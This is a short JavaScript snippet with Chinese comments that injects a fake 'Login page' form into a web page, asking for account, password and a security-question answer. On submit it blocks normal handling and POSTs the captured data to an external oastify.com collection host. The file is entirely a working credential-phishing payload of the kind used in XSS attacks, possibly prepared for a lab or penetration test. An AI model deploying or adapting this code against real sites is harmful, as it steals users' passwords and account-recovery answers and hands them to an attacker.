// 创建标题
const title = document.createElement("h2");
title.textContent = "Login page";
document.body.appendChild(title);

// 创建表单
const form = document.createElement("form");
form.id = "loginForm";

// 创建账号输入
form.appendChild(document.createTextNode("account:"));
const inputUser = document.createElement("input");
inputUser.type = "text";
inputUser.name = "username";
inputUser.required = true;
form.appendChild(inputUser);
form.appendChild(document.createElement("br"));

// 创建密码输入
form.appendChild(document.createTextNode("password:"));
const inputPass = document.createElement("input");
inputPass.type = "password";
inputPass.name = "password";
inputPass.required = true;
form.appendChild(inputPass);
form.appendChild(document.createElement("br"));

// 创建问题答案输入
form.appendChild(document.createTextNode("The answer of your question?"));
const inputAnswer = document.createElement("input");
inputAnswer.type = "text";
inputAnswer.name = "answer";
inputAnswer.required = true;
form.appendChild(inputAnswer);
form.appendChild(document.createElement("br"));
form.appendChild(document.createElement("br"));

// 提交按钮
const submitBtn = document.createElement("button");
submitBtn.type = "submit";
submitBtn.textContent = "submit";
form.appendChild(submitBtn);

// 添加表单到页面
document.body.appendChild(form);

// 监听提交事件
form.addEventListener("submit", function (e) {
  e.preventDefault();

  const formData = new FormData(form);

  fetch("https://rpkw5zol1ltzkuqkjwlvyisogfm7a3ys.oastify.com", {
    method: "POST",
    body: formData
  });
});
